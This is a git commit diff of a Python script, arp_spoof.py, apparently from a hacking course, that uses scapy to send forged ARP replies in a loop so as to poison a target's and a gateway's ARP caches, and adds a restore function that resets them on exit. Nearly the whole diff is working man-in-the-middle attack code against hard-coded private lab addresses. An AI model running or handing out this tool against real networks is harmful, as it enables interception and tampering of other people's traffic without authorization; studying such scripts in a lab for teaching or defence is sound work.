88e3f1825c4cd14f86aa5ca64698d102bdae1116
Chaitanya Solanki <chaitanyasolanki@yahoo.com>
2021-07-18 18:12:39 +0100

    Updated the script

--- Section5/arp_spoof.py
+++ Section5/arp_spoof.py
@@ -2,7 +2,7 @@ from os import supports_follow_symlinks
 import scapy.all as scapy
 import time
 
-from scapy.sendrecv import send
+from scapy.sendrecv import send, sniff
 
 
 def get_mac(ip):
@@ -20,12 +20,32 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     # print(packet.show())
     # print(packet.summary())
-    scapy.send(packet,verbose=False)
+    scapy.send(packet, verbose=False)
 
-sent_packet_count = 0
-while True:
-    spoof("10.0.2.15", "19.0.2.1")
-    spoof("10.0.2.1", "10.0.2.15")
-    sent_packet_count +=2
-    print("Sent two packets: " + str(sent_packet_count))
-    time.sleep(2)
+
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip,
+                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    # print(packet.show())
+    # print(packet.summary())
+    scapy.send(packet, count=4)
+
+target_ip = "10.0.2.15"
+gateway_ip = "10.0.2.1"
+
+try:
+    sent_packet_count = 0
+    while True:
+        
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packet_count += 2
+        print("\r[+] Sent packets: " + str(sent_packet_count), end="")
+        time.sleep(2)
+
+except KeyboardInterrupt:
+    print("\n[+] Quiting the program.")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
